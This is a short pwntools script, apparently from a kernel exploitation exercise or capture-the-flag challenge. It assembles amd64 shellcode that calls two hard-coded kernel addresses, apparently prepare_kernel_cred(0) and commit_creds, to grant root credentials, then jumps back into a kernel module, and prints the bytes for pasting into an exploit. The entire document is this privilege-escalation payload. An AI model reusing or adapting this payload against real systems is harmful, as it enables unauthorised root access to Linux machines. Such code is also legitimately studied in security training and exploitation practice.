from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

sc = asm('''
    xor rdi, rdi
    mov rdx, 0xffffffff810895e0
    call rdx

    mov rdi, rax
    mov rdx, 0xffffffff810892c0
    call rdx

    mov rdx, 0xffffffffc000027e
    jmp rdx
''')

print(f'Length : {len(sc)}')
print('Shellcode : ' + '{' + ', '.join(hex(byte) for byte in sc) + '}')